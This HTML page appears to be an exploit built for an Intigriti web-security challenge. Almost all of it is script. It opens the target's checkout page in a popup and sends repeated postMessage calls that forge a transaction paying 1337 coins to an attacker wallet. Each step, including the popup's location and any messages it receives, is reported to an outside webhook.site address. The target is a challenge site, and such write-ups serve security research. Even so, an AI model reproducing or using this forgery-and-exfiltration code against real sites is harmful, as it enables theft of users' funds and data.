<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Debug Exploit</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
</head>
<body>
    <h1>DEBUG EXPLOIT</h1>
    <div id="log">Starting debug...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/2dab0d49-91b3-44a1-917f-c4332d3d3814';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
        const CURRENCY = '1337COIN';

        function log(msg) {
            document.getElementById('log').innerHTML += '<br>' + msg;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        track('start', 'loaded', {});

        // Try different methods and report which one works
        const methods = [];

        // Method 1: Check for window.opener
        if (window.opener && !window.opener.closed) {
            log('[METHOD 1] Found window.opener');
            track('opener_found', 'success', {});
            methods.push('opener');
        }

        // Method 2: Check for window.parent
        if (window.parent && window.parent !== window) {
            log('[METHOD 2] Found window.parent');
            track('parent_found', 'success', {});
            methods.push('parent');
        }

        // Method 3: Try popup
        log('[METHOD 3] Trying popup...');
        const popup = window.open(
            `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
            'checkout',
            'width=1000,height=800'
        );

        if (popup) {
            log('[SUCCESS] Popup opened!');
            track('popup_opened', 'success', {});
            methods.push('popup');

            // Poll popup status
            let checks = 0;
            const pollPopup = setInterval(() => {
                checks++;
                try {
                    // Try to get popup location
                    const popupLoc = popup.location.href;
                    track('popup_status', 'ok', {
                        url: popupLoc.substring(0, 50),
                        check: checks
                    });
                    log(`Check ${checks}: ${popupLoc.substring(0, 50)}...`);

                    // If still on checkout after 5 seconds, try sending
                    if (checks >= 5 && popupLoc.includes('checkout')) {
                        log('Popup is on checkout - SENDING postMessage...');
                        track('sending_to_popup', 'start', {});

                        popup.postMessage({
                            type: 'submitTransaction',
                            transaction: {
                                toAddress: YOUR_WALLET,
                                currency: CURRENCY,
                                amount: 1337
                            }
                        }, '*');

                        track('tx_sent', 'done', { method: 'popup' });
                        log('postMessage sent to popup!');
                        clearInterval(pollPopup);
                    }
                } catch(e) {
                    // Cross-origin - can't read location
                    track('popup_cross_origin', 'expected', { check: checks });

                    if (checks >= 8) {
                        log('Popup should be loaded - SENDING postMessage...');
                        track('sending_blind', 'start', { check: checks });

                        popup.postMessage({
                            type: 'submitTransaction',
                            transaction: {
                                toAddress: YOUR_WALLET,
                                currency: CURRENCY,
                                amount: 1337
                            }
                        }, '*');

                        track('tx_sent_blind', 'done', {});
                        log('postMessage sent (blind)!');
                        clearInterval(pollPopup);
                    }
                }

                if (checks >= 15) {
                    clearInterval(pollPopup);
                    track('poll_timeout', 'done', { checks });
                }
            }, 1000);
        } else {
            log('[FAILED] Popup blocked!');
            track('popup_blocked', 'failed', {});
        }

        // Listen for ANY messages
        window.addEventListener('message', (event) => {
            log(`[RECEIVED MESSAGE] ${JSON.stringify(event.data).substring(0, 100)}`);
            track('msg_received', 'info', {
                data: JSON.stringify(event.data).substring(0, 200),
                origin: event.origin
            });
        });

        // Summary after 15 seconds
        setTimeout(() => {
            log('=== DEBUG SUMMARY ===');
            log(`Methods available: ${methods.join(', ') || 'none'}`);
            track('summary', 'done', { methods });
        }, 15000);
    </script>
</body>
</html>
